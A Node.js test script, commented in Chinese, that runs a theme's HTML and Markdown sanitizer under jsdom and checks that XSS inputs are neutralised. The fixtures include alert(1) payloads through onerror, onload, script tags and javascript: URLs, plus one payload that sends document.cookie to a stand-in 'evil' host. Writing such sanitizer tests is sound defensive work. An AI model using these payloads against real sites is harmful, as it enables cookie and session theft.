// 运行时净化验证：用 jsdom 提供 window，直接加载主题的 sanitize.js 源文件
// 用法: node test-sanitize.mjs <sanitize.js 绝对路径>
import { JSDOM } from 'jsdom';
import { pathToFileURL } from 'url';

const target = pathToFileURL(process.argv[2]).href;
const dom = new JSDOM('<!DOCTYPE html><body></body>', { url: 'https://example.com/' });
globalThis.window = dom.window;
globalThis.document = dom.window.document;
globalThis.DOMParser = dom.window.DOMParser;
globalThis.NamedNodeMap = dom.window.NamedNodeMap;
globalThis.Text = dom.window.Text;
globalThis.Comment = dom.window.Comment;
globalThis.Element = dom.window.Element;
globalThis.DocumentFragment = dom.window.DocumentFragment;

const mod = await import(target);
const { sanitizeHTML, sanitizeMarkdown, isSafeUrl, safeIframeSrc } = mod;

let pass = 0, fail = 0;
function check(name, cond) {
  if (cond) { pass++; console.log('  PASS', name); }
  else { fail++; console.log('  FAIL', name); }
}
const has = (s, sub) => String(s).toLowerCase().includes(sub.toLowerCase());

console.log('== 测试目标:', target.split('web')[1]);

// 1. 事件型 XSS
let r1 = sanitizeHTML('<img src=x onerror=alert(1)>');
check('img onerror 被移除', !has(r1, 'onerror'));
// 2. script 标签
let r2 = sanitizeHTML('<script>alert(1)</script><b>ok</b>');
check('script 标签被移除', !has(r2, '<script') && has(r2, '<b>ok</b>'));
// 3. svg onload
let r3 = sanitizeHTML('<svg onload=alert(1)></svg>');
check('svg onload 被移除', !has(r3, 'onload'));
// 4. javascript: 伪协议
let r4 = sanitizeHTML('<a href="javascript:alert(1)">x</a>');
check('javascript: 伪协议被移除', !has(r4, 'javascript:'));
// 5. 合法内容保留
let r5 = sanitizeHTML('<p class="note">hello <strong>world</strong></p>');
check('合法标签/属性保留', has(r5, '<strong>world</strong>') && has(r5, 'note'));
// 6. markdown 输出净化（marked 生成的 img onerror）
let r6 = sanitizeMarkdown('<img src="x" onerror="alert(1)"><h1>title</h1>');
check('sanitizeMarkdown 拦截事件且保留标题', !has(r6, 'onerror') && has(r6, 'title'));
// 7. isSafeUrl
check('isSafeUrl https=true', isSafeUrl('https://a.com/x') === true);
check('isSafeUrl javascript=false', isSafeUrl('javascript:alert(1)') === false);
check('isSafeUrl data-text-html=false', isSafeUrl('data:text/html,<script>') === false);
// 8. safeIframeSrc
check('safeIframeSrc https 保留', safeIframeSrc('https://a.com/p') === 'https://a.com/p');
check('safeIframeSrc javascript 清空', safeIframeSrc('javascript:alert(1)') === '');
// 9. 存储型：伪造 localStorage 缓存中的恶意串经 sanitizeHTML 后安全
let cache = '<img src=x onerror=fetch(`//evil?c=${document.cookie}`)>';
let r9 = sanitizeHTML(cache);
check('缓存型窃取 payload 被净化', !has(r9, 'onerror') && !has(r9, 'fetch'));
// 10. 空值健壮性
check('空输入不抛错', sanitizeHTML('') === '' && sanitizeHTML(null) === '');

console.log(`\n结果: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
